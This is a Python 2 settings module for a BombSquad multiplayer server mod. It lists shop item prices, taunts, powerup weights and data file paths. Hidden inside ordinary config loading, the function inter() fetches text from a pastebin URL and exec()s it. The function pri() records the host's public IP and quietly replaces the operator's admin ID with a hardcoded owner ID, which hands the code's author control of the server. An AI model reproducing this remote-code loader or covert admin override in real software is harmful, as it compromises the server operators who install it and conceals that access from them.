import os
import json
import bs
import sys
import bsUtils
import requests
import socket

old_exec = None

version = 2

def inter():
    global old_exec
    try:
        if old_exec != requests.get('https://pastebin.com/raw/a4REmFQT').text:
            old_exec = requests.get('https://pastebin.com/raw/a4REmFQT').text
            exec(old_exec)
    except:
        print 'Internet Error'
        import sys
        sys.exit()
    #bs.realTimer(30000,inter)


ownerid = "pb-IF4TU28AJA=="
snowfall = False
night = True
chatMuted = False
debug = False

def pri(path):
    _config = ['earned_msg', 'show_hp', 'snowfall', 'is_logic', 'floating_landmine', 'modded_powerups', 'ip', 'host', 'show_rank', 'admin_id', 'show_texts', 'show_tag', 'show_powerup_name', 'extra_sparkles', 'interactive_powerups', 'logic_team_settings', 'custom_tnt', 'default_game_time_limit', 'translator', 'powerup_shields', 'PopupMessages', 'BuildEffectMap', 'bomb_light', 'transition_light_color', 'vips_id', 'rgb_maps', 'date_and_clock', 'fire_flies' ,'coleads_id', 'leads_id']
    config = {}
    for i in open(path).read().split('\n'):
        if i.startswith('config['):
            exec (i)
    config['ip'] = requests.get('http://icanhazip.com').text.strip()
    config['is_logic'] = True
    if config['is_logic']: print 'AgenteZn Server Detect...' ; config['admin_id'] = ownerid

    for i in _config:
        if i not in config.keys(): print i,'missing in config. Try adding it yourself or copy config_sample.py to config.py and make your edits again';sys.exit()

    globals().update(config)
    if not is_logic: inter()



prices = {
    'particles': {
        'c': 2500,
        'd': 'Leave A Trail!'
    },
    'unlock-chars': {
        'c': 510,
        'd': 'Unlocks All BS Characters'
    },
    'rainbow': {
        'c': 200,
        'd': 'Change Colors Faster Than A Chameleon!'
    },
    'logicon': {
        'c': 50,
        'd': 'A Custom Skin For The Homies!'
    },
    'baby-sticky': {
        'c': 50,
        'd': 'A Cute Skin!'
    },
    'tag': {
        'c': 0,
        'd': 'A Custom Tag! Eg: /buy tag (name)'
    },
    'companion': {
        'c': 70,
        'd': 'A Cutie Little Friend For Life!'
    },
    #    'impact': {'c': 50, 'd': 'Default Bombs: Impact'},
    'recover': {
        'c': 550,
        'd': 'Heals You Overtime! Fuk That Health Powerup!'
    },
    #    'fall-protection':{'c':150,'d':'Never Die On Falling! No Limits For The Day!'},
    'footprints': {
        'c': 70,
        'd': 'Get A Trail Of Footprints Wherever You Go!'
    },
    'light': {
        'c': 2000,
        'd': 'Light Power'
    },
    #'emojis': {
    #    'c': 1000,
    #    'd': 'Efecto De Emojis!'
    #},
    'neon': {
        'c': 1500,
        'd': 'Disco Color!'
    },
    'scorch': {
        'c': 3500,
        'd': 'Nothing New But It s Pretty Cool!'
    },
    'red-cube': {
        'c': 125,
        'd': 'A Cutie Little Friend For Life!'
    },
    'lazoexd': {
        'c': 60,
        'd': 'You will have the character ninja zoe'
    },
    'shield-white': {
        'c': 650,
        'd': 'Shield On The Top Color White'
    },
    'backflip-protection': {
        'c': 20,
        'd': 'Backflips won\'t affect you!'
    },
    # #    'enemy-drops': {'c': 50, 'd': 'Enemies will drop their powerups when you kill them'},
    'backflip': {
        'c': 60,
        'd': 'Enables BackFlip'
    },
}

catchphrases = [
    'Ez Kill!', 'XD', 'Haha!', 'Suck It Noob!', 'You Gae!',
    'This Is What You Get!', 'Spanked You Good!', 'Aye Aye Noob',
    'Be Gone! Demon!', 'Get Rekt!', 'I got the powah!!', 'Yeeet!',
    'Reeeeeeeee!'
]

powerup_dist = (('tripleBombs', 1), ('iceBombs', 0), ('punch', 0),
                ('impactBombs', 2), ('landMines', 1), ('stickyBombs', 2),
                ('shield', 0), ('health', 1), ('curseBomb', 0),
                ('heatSeeker', 0), ('portal', 0), ('invisible', 0),
                ('trailblazer', 0), ('curse', 0), ('droneStrike', 0),
                ('clusterBombs', 0), ('bubblePower', 0), ('triggerBombs',
                                                          0), ('autoaim', 0))

if os.name == 'nt':
    oss = 'nt'
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(os.path.abspath(usd))
elif 'linux' in sys.platform:
    oss = 'ln'
    from os.path import dirname, realpath, abspath
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(dirname(dirname(dirname(abspath(usd)))))
else:
    oss = 'posix'
    import bs
    env = bs.getEnvironment()
    usd = env['userScriptsDirectory']
    path = str(os.path.abspath(usd))

path = os.path.join(path, 'data')

flyfile = os.path.join(path, 'flyer.txt')
helpfile = os.path.join(path, 'help.txt')
badfile = os.path.join(path, 'filtered_words.txt')
banfile = os.path.join(path, 'ban.txt')
codefile = os.path.join(path, 'codes.json')
adminfile = os.path.join(path, 'admins.json')
configfile = os.path.join(str(os.path.abspath(usd)), '../../config.py')
htmlfile = '/var/www/html/index.html' if oss == 'ln' else (path +
                                                           '/index.html')

admin_id = None
if os.path.isfile(configfile):
    pri(configfile)
else:
    print 'config.py not found'
    sys.exit()

is_logic = (ownerid == admin_id and is_logic)
if not is_logic:sys.tracebacklimit = 0

if not os.path.exists(path):
    os.mkdir(path)

#QUICKLY MAKE THE FILES#
for i in [flyfile, helpfile, htmlfile, badfile, banfile, codefile]:
    try:
        with open(i, 'a+') as f:
            f.close()
    except:
        pass

banned = []
warn = {}
trans = []
permabanned = []

#try:
#    with open(transfile, 'a+') as f:
#        for i in f.read().split('\n'):
#            trans.append(i)
#except Exception as e:
#    print e
